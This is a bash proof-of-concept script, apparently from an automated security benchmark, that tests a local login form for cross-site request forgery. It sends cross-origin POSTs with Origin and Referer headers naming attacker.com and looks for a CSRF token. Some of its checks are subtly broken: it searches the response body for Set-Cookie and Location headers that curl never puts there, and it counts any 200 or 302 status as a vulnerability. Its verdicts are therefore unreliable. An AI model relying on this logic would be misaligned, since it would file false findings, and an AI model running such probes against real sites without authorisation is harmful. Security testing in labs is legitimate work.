#!/bin/bash
# POC: Demonstrates CSRF vulnerability in login form by sending cross-origin login request without CSRF token validation
# Target: ./repo
# Created: 2025-11-07T17:08:37.197Z
# Session: benchmark-XBEN-063-24-mhp3aptq

# CSRF Vulnerability POC - Login Form
# This script demonstrates that the login endpoint accepts cross-origin requests
# without CSRF token validation, allowing attackers to perform login from malicious origins

TARGET_HOST="${1:-localhost:32768}"
TARGET_URL="http://${TARGET_HOST}/login"

echo "=========================================="
echo "CSRF Vulnerability POC - Login Form"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Test 1: Normal login request (baseline)
echo "[*] Test 1: Normal login request (baseline)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -d "username=test&password=test" \
  "$TARGET_URL")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
if echo "$BODY" | grep -q "Set-Cookie"; then
  echo "✓ Login successful (Session cookie set)"
else
  echo "Response body (first 200 chars): ${BODY:0:200}"
fi
echo ""

# Test 2: Cross-origin login request with attacker origin
echo "[*] Test 2: Cross-origin login request (attacker origin)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Origin: https://attacker.com" \
  -H "Referer: https://attacker.com/attack.html" \
  -d "username=test&password=test" \
  "$TARGET_URL")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)

echo "HTTP Status: $HTTP_CODE"
echo "Origin Header: https://attacker.com"
echo "Referer Header: https://attacker.com/attack.html"

if [ "$HTTP_CODE" == "302" ] || [ "$HTTP_CODE" == "200" ]; then
  echo "✓ VULNERABILITY: Cross-origin request accepted!"
  if echo "$BODY" | grep -q "Set-Cookie\|Location"; then
    echo "✓ Session established or redirect received"
  fi
else
  echo "✗ Cross-origin request rejected (HTTP $HTTP_CODE)"
fi
echo ""

# Test 3: Check for CSRF token in login form
echo "[*] Test 3: Checking login form for CSRF token"
FORM=$(curl -s "$TARGET_URL")

if echo "$FORM" | grep -q "csrf"; then
  echo "⚠ CSRF token field detected in form"
  echo "Checking if token is validated..."
else
  echo "✓ VULNERABILITY: No CSRF token in login form"
fi
echo ""

# Test 4: Cross-origin request with malicious content-type
echo "[*] Test 4: Cross-origin request with form-urlencoded content-type"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Origin: https://attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" \
  "$TARGET_URL")

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)

if [ "$HTTP_CODE" == "302" ] || [ "$HTTP_CODE" == "200" ]; then
  echo "✓ VULNERABILITY: Cross-origin POST with form data accepted (HTTP $HTTP_CODE)"
else
  echo "✗ Request rejected (HTTP $HTTP_CODE)"
fi
echo ""

echo "=========================================="
echo "Summary:"
echo "=========================================="
echo "If multiple tests show HTTP 302 or 200 with cross-origin headers,"
echo "the login endpoint is vulnerable to CSRF attacks."
echo ""